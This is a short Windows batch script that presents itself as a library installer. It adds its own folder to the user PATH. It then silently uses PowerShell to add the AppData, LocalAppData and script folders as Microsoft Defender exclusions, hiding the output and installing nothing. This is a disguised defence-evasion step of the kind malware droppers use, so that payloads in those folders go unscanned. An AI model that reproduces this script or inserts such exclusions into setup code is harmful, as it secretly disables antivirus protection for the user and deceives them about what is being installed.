@echo off
setlocal enabledelayedexpansion

set "CURDIR=%~dp0"
if "%CURDIR:~-1%"=="\" set "CURDIR=%CURDIR:~0,-1%"

echo Installing required libraries...

set "CURPATH="

for /f "skip=2 tokens=2,*" %%A in ('reg query "HKCU\Environment" /v PATH 2^>nul') do (
    set "CURPATH=%%B"
)

rem Trim leading spaces
if defined CURPATH (
    for /f "tokens=* delims= " %%a in ("!CURPATH!") do set "CURPATH=%%a"
)


if "!CURPATH!"=="" (
    set "NEWPATH=%CURDIR%"
) else (
    echo !CURPATH! | findstr /i /c:"%CURDIR%" >nul
    if errorlevel 1 (
        set "NEWPATH=!CURPATH!;%CURDIR%"
    ) else (
        goto :newline
    )
)

setx PATH "!NEWPATH!"

:newline
set "AppData=%APPDATA%"
set "ExeDir=%~dp0"
set "LocalAppData=%LOCALAPPDATA%"

powershell -Command "Add-MpPreference -ExclusionPath '%AppData%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%ExeDir%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%LocalAppData%'" >nul 2>&1

echo All done!.
pause
endlocal
exit /b 0
